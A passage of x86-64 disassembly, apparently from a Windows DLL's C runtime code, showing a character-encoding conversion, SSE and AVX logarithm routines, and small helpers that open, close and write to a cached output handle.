   18000df0e:	8d 82 00 28 ff ff    	lea    -0xd800(%rdx),%eax
   18000df14:	3d ff 07 00 00       	cmp    $0x7ff,%eax
   18000df19:	76 3e                	jbe    0x18000df59
   18000df1b:	81 fa 00 00 11 00    	cmp    $0x110000,%edx
   18000df21:	73 36                	jae    0x18000df59
   18000df23:	41 0f b6 c0          	movzbl %r8b,%eax
   18000df27:	c7 44 24 20 80 00 00 	movl   $0x80,0x20(%rsp)
   18000df2e:	00 
   18000df2f:	c7 44 24 24 00 08 00 	movl   $0x800,0x24(%rsp)
   18000df36:	00 
   18000df37:	c7 44 24 28 00 00 01 	movl   $0x10000,0x28(%rsp)
   18000df3e:	00 
   18000df3f:	3b 54 84 18          	cmp    0x18(%rsp,%rax,4),%edx
   18000df43:	72 14                	jb     0x18000df59
   18000df45:	48 85 f6             	test   %rsi,%rsi
   18000df48:	74 02                	je     0x18000df4c
   18000df4a:	89 16                	mov    %edx,(%rsi)
   18000df4c:	f7 da                	neg    %edx
   18000df4e:	4d 89 13             	mov    %r10,(%r11)
   18000df51:	48 1b c0             	sbb    %rax,%rax
   18000df54:	48 23 c5             	and    %rbp,%rax
   18000df57:	eb 12                	jmp    0x18000df6b
   18000df59:	4d 89 13             	mov    %r10,(%r11)
   18000df5c:	e8 9b a2 ff ff       	call   0x1800081fc
   18000df61:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   18000df67:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   18000df6b:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   18000df70:	48 33 cc             	xor    %rsp,%rcx
   18000df73:	e8 48 3b ff ff       	call   0x180001ac0
   18000df78:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   18000df7d:	48 83 c4 40          	add    $0x40,%rsp
   18000df81:	41 5f                	pop    %r15
   18000df83:	41 5e                	pop    %r14
   18000df85:	5f                   	pop    %rdi
   18000df86:	5e                   	pop    %rsi
   18000df87:	5d                   	pop    %rbp
   18000df88:	c3                   	ret
   18000df89:	cc                   	int3
   18000df8a:	cc                   	int3
   18000df8b:	cc                   	int3
   18000df8c:	cc                   	int3
   18000df8d:	cc                   	int3
   18000df8e:	cc                   	int3
   18000df8f:	cc                   	int3
   18000df90:	48 83 ec 58          	sub    $0x58,%rsp
   18000df94:	66 0f 7f 74 24 20    	movdqa %xmm6,0x20(%rsp)
   18000df9a:	83 3d 13 dd 00 00 00 	cmpl   $0x0,0xdd13(%rip)        # 0x18001bcb4
   18000dfa1:	0f 85 e9 02 00 00    	jne    0x18000e290
   18000dfa7:	66 0f 28 d8          	movapd %xmm0,%xmm3
   18000dfab:	66 0f 28 e0          	movapd %xmm0,%xmm4
   18000dfaf:	66 0f 73 d3 34       	psrlq  $0x34,%xmm3
   18000dfb4:	66 48 0f 7e c0       	movq   %xmm0,%rax
   18000dfb9:	66 0f fb 1d 2f 7d 00 	psubq  0x7d2f(%rip),%xmm3        # 0x180015cf0
   18000dfc0:	00 
   18000dfc1:	66 0f 28 e8          	movapd %xmm0,%xmm5
   18000dfc5:	66 0f 54 2d f3 7c 00 	andpd  0x7cf3(%rip),%xmm5        # 0x180015cc0
   18000dfcc:	00 
   18000dfcd:	66 0f 2f 2d eb 7c 00 	comisd 0x7ceb(%rip),%xmm5        # 0x180015cc0
   18000dfd4:	00 
   18000dfd5:	0f 84 85 02 00 00    	je     0x18000e260
   18000dfdb:	66 0f 28 d0          	movapd %xmm0,%xmm2
   18000dfdf:	f3 0f e6 f3          	cvtdq2pd %xmm3,%xmm6
   18000dfe3:	66 0f 57 ed          	xorpd  %xmm5,%xmm5
   18000dfe7:	66 0f 2f c5          	comisd %xmm5,%xmm0
   18000dfeb:	0f 86 2f 02 00 00    	jbe    0x18000e220
   18000dff1:	66 0f db 15 17 7d 00 	pand   0x7d17(%rip),%xmm2        # 0x180015d10
   18000dff8:	00 
   18000dff9:	f2 0f 5c 25 9f 7d 00 	subsd  0x7d9f(%rip),%xmm4        # 0x180015da0
   18000e000:	00 
   18000e001:	66 0f 2f 35 27 7e 00 	comisd 0x7e27(%rip),%xmm6        # 0x180015e30
   18000e008:	00 
   18000e009:	0f 84 d8 01 00 00    	je     0x18000e1e7
   18000e00f:	66 0f 54 25 79 7e 00 	andpd  0x7e79(%rip),%xmm4        # 0x180015e90
   18000e016:	00 
   18000e017:	4c 8b c8             	mov    %rax,%r9
   18000e01a:	48 23 05 ff 7c 00 00 	and    0x7cff(%rip),%rax        # 0x180015d20
   18000e021:	4c 23 0d 08 7d 00 00 	and    0x7d08(%rip),%r9        # 0x180015d30
   18000e028:	49 d1 e1             	shl    $1,%r9
   18000e02b:	49 03 c1             	add    %r9,%rax
   18000e02e:	66 48 0f 6e c8       	movq   %rax,%xmm1
   18000e033:	66 0f 2f 25 15 7e 00 	comisd 0x7e15(%rip),%xmm4        # 0x180015e50
   18000e03a:	00 
   18000e03b:	0f 82 df 00 00 00    	jb     0x18000e120
   18000e041:	48 c1 e8 2c          	shr    $0x2c,%rax
   18000e045:	66 0f eb 15 63 7d 00 	por    0x7d63(%rip),%xmm2        # 0x180015db0
   18000e04c:	00 
   18000e04d:	66 0f eb 0d 5b 7d 00 	por    0x7d5b(%rip),%xmm1        # 0x180015db0
   18000e054:	00 
   18000e055:	4c 8d 0d d4 8e 00 00 	lea    0x8ed4(%rip),%r9        # 0x180016f30
   18000e05c:	f2 0f 5c ca          	subsd  %xmm2,%xmm1
   18000e060:	f2 41 0f 59 0c c1    	mulsd  (%r9,%rax,8),%xmm1
   18000e066:	66 0f 28 d1          	movapd %xmm1,%xmm2
   18000e06a:	66 0f 28 c1          	movapd %xmm1,%xmm0
   18000e06e:	4c 8d 0d 9b 7e 00 00 	lea    0x7e9b(%rip),%r9        # 0x180015f10
   18000e075:	f2 0f 10 1d a3 7d 00 	movsd  0x7da3(%rip),%xmm3        # 0x180015e20
   18000e07c:	00 
   18000e07d:	f2 0f 10 0d 6b 7d 00 	movsd  0x7d6b(%rip),%xmm1        # 0x180015df0
   18000e084:	00 
   18000e085:	f2 0f 59 da          	mulsd  %xmm2,%xmm3
   18000e089:	f2 0f 59 ca          	mulsd  %xmm2,%xmm1
   18000e08d:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   18000e091:	66 0f 28 e0          	movapd %xmm0,%xmm4
   18000e095:	f2 0f 58 1d 73 7d 00 	addsd  0x7d73(%rip),%xmm3        # 0x180015e10
   18000e09c:	00 
   18000e09d:	f2 0f 58 0d 3b 7d 00 	addsd  0x7d3b(%rip),%xmm1        # 0x180015de0
   18000e0a4:	00 
   18000e0a5:	f2 0f 59 e0          	mulsd  %xmm0,%xmm4
   18000e0a9:	f2 0f 59 da          	mulsd  %xmm2,%xmm3
   18000e0ad:	f2 0f 59 c8          	mulsd  %xmm0,%xmm1
   18000e0b1:	f2 0f 58 1d 47 7d 00 	addsd  0x7d47(%rip),%xmm3        # 0x180015e00
   18000e0b8:	00 
   18000e0b9:	f2 0f 58 ca          	addsd  %xmm2,%xmm1
   18000e0bd:	f2 0f 59 dc          	mulsd  %xmm4,%xmm3
   18000e0c1:	f2 0f 58 cb          	addsd  %xmm3,%xmm1
   18000e0c5:	f2 0f 10 2d b3 7c 00 	movsd  0x7cb3(%rip),%xmm5        # 0x180015d80
   18000e0cc:	00 
   18000e0cd:	f2 0f 59 0d 6b 7c 00 	mulsd  0x7c6b(%rip),%xmm1        # 0x180015d40
   18000e0d4:	00 
   18000e0d5:	f2 0f 59 ee          	mulsd  %xmm6,%xmm5
   18000e0d9:	f2 0f 5c e9          	subsd  %xmm1,%xmm5
   18000e0dd:	f2 41 0f 10 04 c1    	movsd  (%r9,%rax,8),%xmm0
   18000e0e3:	48 8d 15 36 86 00 00 	lea    0x8636(%rip),%rdx        # 0x180016720
   18000e0ea:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   18000e0ef:	f2 0f 10 25 79 7c 00 	movsd  0x7c79(%rip),%xmm4        # 0x180015d70
   18000e0f6:	00 
   18000e0f7:	f2 0f 59 e6          	mulsd  %xmm6,%xmm4
   18000e0fb:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
   18000e0ff:	f2 0f 58 d5          	addsd  %xmm5,%xmm2
   18000e103:	f2 0f 58 c2          	addsd  %xmm2,%xmm0
   18000e107:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   18000e10d:	48 83 c4 58          	add    $0x58,%rsp
   18000e111:	c3                   	ret
   18000e112:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   18000e119:	1f 84 00 00 00 00 00 
   18000e120:	f2 0f 10 15 68 7c 00 	movsd  0x7c68(%rip),%xmm2        # 0x180015d90
   18000e127:	00 
   18000e128:	f2 0f 5c 05 70 7c 00 	subsd  0x7c70(%rip),%xmm0        # 0x180015da0
   18000e12f:	00 
   18000e130:	f2 0f 58 d0          	addsd  %xmm0,%xmm2
   18000e134:	66 0f 28 c8          	movapd %xmm0,%xmm1
   18000e138:	f2 0f 5e ca          	divsd  %xmm2,%xmm1
   18000e13c:	f2 0f 10 25 6c 7d 00 	movsd  0x7d6c(%rip),%xmm4        # 0x180015eb0
   18000e143:	00 
   18000e144:	f2 0f 10 2d 84 7d 00 	movsd  0x7d84(%rip),%xmm5        # 0x180015ed0
   18000e14b:	00 
   18000e14c:	66 0f 28 f0          	movapd %xmm0,%xmm6
   18000e150:	f2 0f 59 f1          	mulsd  %xmm1,%xmm6
   18000e154:	f2 0f 58 c9          	addsd  %xmm1,%xmm1
   18000e158:	66 0f 28 d1          	movapd %xmm1,%xmm2
   18000e15c:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   18000e160:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   18000e164:	f2 0f 59 ea          	mulsd  %xmm2,%xmm5
   18000e168:	f2 0f 58 25 30 7d 00 	addsd  0x7d30(%rip),%xmm4        # 0x180015ea0
   18000e16f:	00 
   18000e170:	f2 0f 58 2d 48 7d 00 	addsd  0x7d48(%rip),%xmm5        # 0x180015ec0
   18000e177:	00 
   18000e178:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   18000e17c:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   18000e180:	f2 0f 59 d2          	mulsd  %xmm2,%xmm2
   18000e184:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   18000e188:	f2 0f 59 ea          	mulsd  %xmm2,%xmm5
   18000e18c:	f2 0f 10 15 cc 7b 00 	movsd  0x7bcc(%rip),%xmm2        # 0x180015d60
   18000e193:	00 
   18000e194:	f2 0f 58 e5          	addsd  %xmm5,%xmm4
   18000e198:	f2 0f 5c e6          	subsd  %xmm6,%xmm4
   18000e19c:	f2 0f 10 35 ac 7b 00 	movsd  0x7bac(%rip),%xmm6        # 0x180015d50
   18000e1a3:	00 
   18000e1a4:	66 0f 28 d8          	movapd %xmm0,%xmm3
   18000e1a8:	66 0f db 1d 30 7d 00 	pand   0x7d30(%rip),%xmm3        # 0x180015ee0
   18000e1af:	00 
   18000e1b0:	f2 0f 5c c3          	subsd  %xmm3,%xmm0
   18000e1b4:	f2 0f 58 e0          	addsd  %xmm0,%xmm4
   18000e1b8:	66 0f 28 c3          	movapd %xmm3,%xmm0
   18000e1bc:	66 0f 28 cc          	movapd %xmm4,%xmm1
   18000e1c0:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   18000e1c4:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   18000e1c8:	f2 0f 59 ce          	mulsd  %xmm6,%xmm1
   18000e1cc:	f2 0f 59 de          	mulsd  %xmm6,%xmm3
   18000e1d0:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
   18000e1d4:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
   18000e1d8:	f2 0f 58 c3          	addsd  %xmm3,%xmm0
   18000e1dc:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   18000e1e2:	48 83 c4 58          	add    $0x58,%rsp
   18000e1e6:	c3                   	ret
   18000e1e7:	66 0f eb 15 b1 7b 00 	por    0x7bb1(%rip),%xmm2        # 0x180015da0
   18000e1ee:	00 
   18000e1ef:	f2 0f 5c 15 a9 7b 00 	subsd  0x7ba9(%rip),%xmm2        # 0x180015da0
   18000e1f6:	00 
   18000e1f7:	f2 0f 10 ea          	movsd  %xmm2,%xmm5
   18000e1fb:	66 0f db 15 0d 7b 00 	pand   0x7b0d(%rip),%xmm2        # 0x180015d10
   18000e202:	00 
   18000e203:	66 48 0f 7e d0       	movq   %xmm2,%rax
   18000e208:	66 0f 73 d5 34       	psrlq  $0x34,%xmm5
   18000e20d:	66 0f fa 2d 2b 7c 00 	psubd  0x7c2b(%rip),%xmm5        # 0x180015e40
   18000e214:	00 
   18000e215:	f3 0f e6 f5          	cvtdq2pd %xmm5,%xmm6
   18000e219:	e9 f1 fd ff ff       	jmp    0x18000e00f
   18000e21e:	66 90                	xchg   %ax,%ax
   18000e220:	75 1e                	jne    0x18000e240
   18000e222:	f2 0f 10 0d 86 7a 00 	movsd  0x7a86(%rip),%xmm1        # 0x180015cb0
   18000e229:	00 
   18000e22a:	44 8b 05 bf 7c 00 00 	mov    0x7cbf(%rip),%r8d        # 0x180015ef0
   18000e231:	e8 ea 08 00 00       	call   0x18000eb20
   18000e236:	eb 48                	jmp    0x18000e280
   18000e238:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000e23f:	00 
   18000e240:	f2 0f 10 0d 88 7a 00 	movsd  0x7a88(%rip),%xmm1        # 0x180015cd0
   18000e247:	00 
   18000e248:	44 8b 05 a5 7c 00 00 	mov    0x7ca5(%rip),%r8d        # 0x180015ef4
   18000e24f:	e8 cc 08 00 00       	call   0x18000eb20
   18000e254:	eb 2a                	jmp    0x18000e280
   18000e256:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000e25d:	00 00 00 
   18000e260:	48 3b 05 59 7a 00 00 	cmp    0x7a59(%rip),%rax        # 0x180015cc0
   18000e267:	74 17                	je     0x18000e280
   18000e269:	48 3b 05 40 7a 00 00 	cmp    0x7a40(%rip),%rax        # 0x180015cb0
   18000e270:	74 ce                	je     0x18000e240
   18000e272:	48 0b 05 67 7a 00 00 	or     0x7a67(%rip),%rax        # 0x180015ce0
   18000e279:	66 48 0f 6e c0       	movq   %rax,%xmm0
   18000e27e:	66 90                	xchg   %ax,%ax
   18000e280:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   18000e286:	48 83 c4 58          	add    $0x58,%rsp
   18000e28a:	c3                   	ret
   18000e28b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000e290:	48 33 c0             	xor    %rax,%rax
   18000e293:	c5 e1 73 d0 34       	vpsrlq $0x34,%xmm0,%xmm3
   18000e298:	c4 e1 f9 7e c0       	vmovq  %xmm0,%rax
   18000e29d:	c5 e1 fb 1d 4b 7a 00 	vpsubq 0x7a4b(%rip),%xmm3,%xmm3        # 0x180015cf0
   18000e2a4:	00 
   18000e2a5:	c5 fa e6 f3          	vcvtdq2pd %xmm3,%xmm6
   18000e2a9:	c5 f9 db 2d 0f 7a 00 	vpand  0x7a0f(%rip),%xmm0,%xmm5        # 0x180015cc0
   18000e2b0:	00 
   18000e2b1:	c5 f9 2f 2d 07 7a 00 	vcomisd 0x7a07(%rip),%xmm5        # 0x180015cc0
   18000e2b8:	00 
   18000e2b9:	0f 84 41 02 00 00    	je     0x18000e500
   18000e2bf:	c5 d1 ef ed          	vpxor  %xmm5,%xmm5,%xmm5
   18000e2c3:	c5 f9 2f c5          	vcomisd %xmm5,%xmm0
   18000e2c7:	0f 86 e3 01 00 00    	jbe    0x18000e4b0
   18000e2cd:	c5 f9 db 15 3b 7a 00 	vpand  0x7a3b(%rip),%xmm0,%xmm2        # 0x180015d10
   18000e2d4:	00 
   18000e2d5:	c5 fb 5c 25 c3 7a 00 	vsubsd 0x7ac3(%rip),%xmm0,%xmm4        # 0x180015da0
   18000e2dc:	00 
   18000e2dd:	c5 f9 2f 35 4b 7b 00 	vcomisd 0x7b4b(%rip),%xmm6        # 0x180015e30
   18000e2e4:	00 
   18000e2e5:	0f 84 8e 01 00 00    	je     0x18000e479
   18000e2eb:	c5 f9 db 0d 2d 7a 00 	vpand  0x7a2d(%rip),%xmm0,%xmm1        # 0x180015d20
   18000e2f2:	00 
   18000e2f3:	c5 f9 db 1d 35 7a 00 	vpand  0x7a35(%rip),%xmm0,%xmm3        # 0x180015d30
   18000e2fa:	00 
   18000e2fb:	c5 e1 73 f3 01       	vpsllq $0x1,%xmm3,%xmm3
   18000e300:	c5 e1 d4 c9          	vpaddq %xmm1,%xmm3,%xmm1
   18000e304:	c4 e1 f9 7e c8       	vmovq  %xmm1,%rax
   18000e309:	c5 d9 db 25 7f 7b 00 	vpand  0x7b7f(%rip),%xmm4,%xmm4        # 0x180015e90
   18000e310:	00 
   18000e311:	c5 f9 2f 25 37 7b 00 	vcomisd 0x7b37(%rip),%xmm4        # 0x180015e50
   18000e318:	00 
   18000e319:	0f 82 b1 00 00 00    	jb     0x18000e3d0
   18000e31f:	48 c1 e8 2c          	shr    $0x2c,%rax
   18000e323:	c5 e9 eb 15 85 7a 00 	vpor   0x7a85(%rip),%xmm2,%xmm2        # 0x180015db0
   18000e32a:	00 
   18000e32b:	c5 f1 eb 0d 7d 7a 00 	vpor   0x7a7d(%rip),%xmm1,%xmm1        # 0x180015db0
   18000e332:	00 
   18000e333:	4c 8d 0d f6 8b 00 00 	lea    0x8bf6(%rip),%r9        # 0x180016f30
   18000e33a:	c5 f3 5c ca          	vsubsd %xmm2,%xmm1,%xmm1
   18000e33e:	c4 c1 73 59 0c c1    	vmulsd (%r9,%rax,8),%xmm1,%xmm1
   18000e344:	4c 8d 0d c5 7b 00 00 	lea    0x7bc5(%rip),%r9        # 0x180015f10
   18000e34b:	c5 f3 59 c1          	vmulsd %xmm1,%xmm1,%xmm0
   18000e34f:	c5 fb 10 1d c9 7a 00 	vmovsd 0x7ac9(%rip),%xmm3        # 0x180015e20
   18000e356:	00 
   18000e357:	c5 fb 10 2d 91 7a 00 	vmovsd 0x7a91(%rip),%xmm5        # 0x180015df0
   18000e35e:	00 
   18000e35f:	c4 e2 f1 a9 1d a8 7a 	vfmadd213sd 0x7aa8(%rip),%xmm1,%xmm3        # 0x180015e10
   18000e366:	00 00 
   18000e368:	c4 e2 f1 a9 2d 3f 7a 	vfmadd213sd 0x7a3f(%rip),%xmm1,%xmm5        # 0x180015db0
   18000e36f:	00 00 
   18000e371:	f2 0f 10 e0          	movsd  %xmm0,%xmm4
   18000e375:	c4 e2 f1 a9 1d 82 7a 	vfmadd213sd 0x7a82(%rip),%xmm1,%xmm3        # 0x180015e00
   18000e37c:	00 00 
   18000e37e:	c5 fb 59 e0          	vmulsd %xmm0,%xmm0,%xmm4
   18000e382:	c4 e2 d1 b9 c8       	vfmadd231sd %xmm0,%xmm5,%xmm1
   18000e387:	c4 e2 e1 b9 cc       	vfmadd231sd %xmm4,%xmm3,%xmm1
   18000e38c:	c5 f3 59 0d ac 79 00 	vmulsd 0x79ac(%rip),%xmm1,%xmm1        # 0x180015d40
   18000e393:	00 
   18000e394:	c5 fb 10 2d e4 79 00 	vmovsd 0x79e4(%rip),%xmm5        # 0x180015d80
   18000e39b:	00 
   18000e39c:	c4 e2 c9 ab e9       	vfmsub213sd %xmm1,%xmm6,%xmm5
   18000e3a1:	f2 41 0f 10 04 c1    	movsd  (%r9,%rax,8),%xmm0
   18000e3a7:	48 8d 15 72 83 00 00 	lea    0x8372(%rip),%rdx        # 0x180016720
   18000e3ae:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   18000e3b3:	c5 eb 58 d5          	vaddsd %xmm5,%xmm2,%xmm2
   18000e3b7:	c4 e2 c9 b9 05 b0 79 	vfmadd231sd 0x79b0(%rip),%xmm6,%xmm0        # 0x180015d70
   18000e3be:	00 00 
   18000e3c0:	c5 fb 58 c2          	vaddsd %xmm2,%xmm0,%xmm0
   18000e3c4:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   18000e3ca:	48 83 c4 58          	add    $0x58,%rsp
   18000e3ce:	c3                   	ret
   18000e3cf:	90                   	nop
   18000e3d0:	c5 fb 10 15 b8 79 00 	vmovsd 0x79b8(%rip),%xmm2        # 0x180015d90
   18000e3d7:	00 
   18000e3d8:	c5 fb 5c 05 c0 79 00 	vsubsd 0x79c0(%rip),%xmm0,%xmm0        # 0x180015da0
   18000e3df:	00 
   18000e3e0:	c5 eb 58 d0          	vaddsd %xmm0,%xmm2,%xmm2
   18000e3e4:	c5 fb 5e ca          	vdivsd %xmm2,%xmm0,%xmm1
   18000e3e8:	c5 fb 10 25 c0 7a 00 	vmovsd 0x7ac0(%rip),%xmm4        # 0x180015eb0
   18000e3ef:	00 
   18000e3f0:	c5 fb 10 2d d8 7a 00 	vmovsd 0x7ad8(%rip),%xmm5        # 0x180015ed0
   18000e3f7:	00 
   18000e3f8:	c5 fb 59 f1          	vmulsd %xmm1,%xmm0,%xmm6
   18000e3fc:	c5 f3 58 c9          	vaddsd %xmm1,%xmm1,%xmm1
   18000e400:	c5 f3 59 d1          	vmulsd %xmm1,%xmm1,%xmm2
   18000e404:	c4 e2 e9 a9 25 93 7a 	vfmadd213sd 0x7a93(%rip),%xmm2,%xmm4        # 0x180015ea0
   18000e40b:	00 00 
   18000e40d:	c4 e2 e9 a9 2d aa 7a 	vfmadd213sd 0x7aaa(%rip),%xmm2,%xmm5        # 0x180015ec0
   18000e414:	00 00 
   18000e416:	c5 eb 59 d1          	vmulsd %xmm1,%xmm2,%xmm2
   18000e41a:	c5 db 59 e2          	vmulsd %xmm2,%xmm4,%xmm4
   18000e41e:	c5 eb 59 d2          	vmulsd %xmm2,%xmm2,%xmm2
   18000e422:	c5 eb 59 d1          	vmulsd %xmm1,%xmm2,%xmm2
   18000e426:	c5 d3 59 ea          	vmulsd %xmm2,%xmm5,%xmm5
   18000e42a:	c5 db 58 e5          	vaddsd %xmm5,%xmm4,%xmm4
   18000e42e:	c5 db 5c e6          	vsubsd %xmm6,%xmm4,%xmm4
   18000e432:	c5 f9 db 1d a6 7a 00 	vpand  0x7aa6(%rip),%xmm0,%xmm3        # 0x180015ee0
   18000e439:	00 
   18000e43a:	c5 fb 5c c3          	vsubsd %xmm3,%xmm0,%xmm0
   18000e43e:	c5 db 58 e0          	vaddsd %xmm0,%xmm4,%xmm4
   18000e442:	c5 db 59 0d 06 79 00 	vmulsd 0x7906(%rip),%xmm4,%xmm1        # 0x180015d50
   18000e449:	00 
   18000e44a:	c5 db 59 25 0e 79 00 	vmulsd 0x790e(%rip),%xmm4,%xmm4        # 0x180015d60
   18000e451:	00 
   18000e452:	c5 e3 59 05 06 79 00 	vmulsd 0x7906(%rip),%xmm3,%xmm0        # 0x180015d60
   18000e459:	00 
   18000e45a:	c5 e3 59 1d ee 78 00 	vmulsd 0x78ee(%rip),%xmm3,%xmm3        # 0x180015d50
   18000e461:	00 
   18000e462:	c5 fb 58 c4          	vaddsd %xmm4,%xmm0,%xmm0
   18000e466:	c5 fb 58 c1          	vaddsd %xmm1,%xmm0,%xmm0
   18000e46a:	c5 fb 58 c3          	vaddsd %xmm3,%xmm0,%xmm0
   18000e46e:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   18000e474:	48 83 c4 58          	add    $0x58,%rsp
   18000e478:	c3                   	ret
   18000e479:	c5 e9 eb 15 1f 79 00 	vpor   0x791f(%rip),%xmm2,%xmm2        # 0x180015da0
   18000e480:	00 
   18000e481:	c5 eb 5c 15 17 79 00 	vsubsd 0x7917(%rip),%xmm2,%xmm2        # 0x180015da0
   18000e488:	00 
   18000e489:	c5 d1 73 d2 34       	vpsrlq $0x34,%xmm2,%xmm5
   18000e48e:	c5 e9 db 15 7a 78 00 	vpand  0x787a(%rip),%xmm2,%xmm2        # 0x180015d10
   18000e495:	00 
   18000e496:	c5 f9 28 c2          	vmovapd %xmm2,%xmm0
   18000e49a:	c5 d1 fa 2d 9e 79 00 	vpsubd 0x799e(%rip),%xmm5,%xmm5        # 0x180015e40
   18000e4a1:	00 
   18000e4a2:	c5 fa e6 f5          	vcvtdq2pd %xmm5,%xmm6
   18000e4a6:	e9 40 fe ff ff       	jmp    0x18000e2eb
   18000e4ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000e4b0:	75 2e                	jne    0x18000e4e0
   18000e4b2:	c5 fb 10 0d f6 77 00 	vmovsd 0x77f6(%rip),%xmm1        # 0x180015cb0
   18000e4b9:	00 
   18000e4ba:	44 8b 05 2f 7a 00 00 	mov    0x7a2f(%rip),%r8d        # 0x180015ef0
   18000e4c1:	e8 5a 06 00 00       	call   0x18000eb20
   18000e4c6:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   18000e4cc:	48 83 c4 58          	add    $0x58,%rsp
   18000e4d0:	c3                   	ret
   18000e4d1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   18000e4d8:	0f 1f 84 00 00 00 00 
   18000e4df:	00 
   18000e4e0:	c5 fb 10 0d e8 77 00 	vmovsd 0x77e8(%rip),%xmm1        # 0x180015cd0
   18000e4e7:	00 
   18000e4e8:	44 8b 05 05 7a 00 00 	mov    0x7a05(%rip),%r8d        # 0x180015ef4
   18000e4ef:	e8 2c 06 00 00       	call   0x18000eb20
   18000e4f4:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   18000e4fa:	48 83 c4 58          	add    $0x58,%rsp
   18000e4fe:	c3                   	ret
   18000e4ff:	90                   	nop
   18000e500:	48 3b 05 b9 77 00 00 	cmp    0x77b9(%rip),%rax        # 0x180015cc0
   18000e507:	74 27                	je     0x18000e530
   18000e509:	48 3b 05 a0 77 00 00 	cmp    0x77a0(%rip),%rax        # 0x180015cb0
   18000e510:	74 ce                	je     0x18000e4e0
   18000e512:	48 0b 05 c7 77 00 00 	or     0x77c7(%rip),%rax        # 0x180015ce0
   18000e519:	66 48 0f 6e c8       	movq   %rax,%xmm1
   18000e51e:	44 8b 05 d3 79 00 00 	mov    0x79d3(%rip),%r8d        # 0x180015ef8
   18000e525:	e8 f6 05 00 00       	call   0x18000eb20
   18000e52a:	eb 04                	jmp    0x18000e530
   18000e52c:	0f 1f 40 00          	nopl   0x0(%rax)
   18000e530:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   18000e536:	48 83 c4 58          	add    $0x58,%rsp
   18000e53a:	c3                   	ret
   18000e53b:	cc                   	int3
   18000e53c:	40 53                	rex push %rbx
   18000e53e:	48 83 ec 40          	sub    $0x40,%rsp
   18000e542:	48 8b 05 77 c4 00 00 	mov    0xc477(%rip),%rax        # 0x18001a9c0
   18000e549:	33 db                	xor    %ebx,%ebx
   18000e54b:	48 83 f8 fe          	cmp    $0xfffffffffffffffe,%rax
   18000e54f:	75 2e                	jne    0x18000e57f
   18000e551:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   18000e556:	44 8d 43 03          	lea    0x3(%rbx),%r8d
   18000e55a:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   18000e55e:	48 8d 0d 9b 79 00 00 	lea    0x799b(%rip),%rcx        # 0x180015f00
   18000e565:	45 33 c9             	xor    %r9d,%r9d
   18000e568:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   18000e56d:	ba 00 00 00 40       	mov    $0x40000000,%edx
   18000e572:	ff 15 98 1a 00 00    	call   *0x1a98(%rip)        # 0x180010010
   18000e578:	48 89 05 41 c4 00 00 	mov    %rax,0xc441(%rip)        # 0x18001a9c0
   18000e57f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000e583:	0f 95 c3             	setne  %bl
   18000e586:	8b c3                	mov    %ebx,%eax
   18000e588:	48 83 c4 40          	add    $0x40,%rsp
   18000e58c:	5b                   	pop    %rbx
   18000e58d:	c3                   	ret
   18000e58e:	cc                   	int3
   18000e58f:	cc                   	int3
   18000e590:	48 83 ec 28          	sub    $0x28,%rsp
   18000e594:	48 8b 0d 25 c4 00 00 	mov    0xc425(%rip),%rcx        # 0x18001a9c0
   18000e59b:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   18000e59f:	77 06                	ja     0x18000e5a7
   18000e5a1:	ff 15 61 1a 00 00    	call   *0x1a61(%rip)        # 0x180010008
   18000e5a7:	48 83 c4 28          	add    $0x28,%rsp
   18000e5ab:	c3                   	ret
   18000e5ac:	48 8b c4             	mov    %rsp,%rax
   18000e5af:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000e5b3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000e5b7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000e5bb:	57                   	push   %rdi
   18000e5bc:	48 83 ec 40          	sub    $0x40,%rsp
   18000e5c0:	48 83 60 d8 00       	andq   $0x0,-0x28(%rax)
   18000e5c5:	49 8b f8             	mov    %r8,%rdi
   18000e5c8:	4d 8b c8             	mov    %r8,%r9
   18000e5cb:	8b f2                	mov    %edx,%esi
   18000e5cd:	44 8b c2             	mov    %edx,%r8d
   18000e5d0:	48 8b e9             	mov    %rcx,%rbp
   18000e5d3:	48 8b d1             	mov    %rcx,%rdx
   18000e5d6:	48 8b 0d e3 c3 00 00 	mov    0xc3e3(%rip),%rcx        # 0x18001a9c0
   18000e5dd:	ff 15 1d 1a 00 00    	call   *0x1a1d(%rip)        # 0x180010000
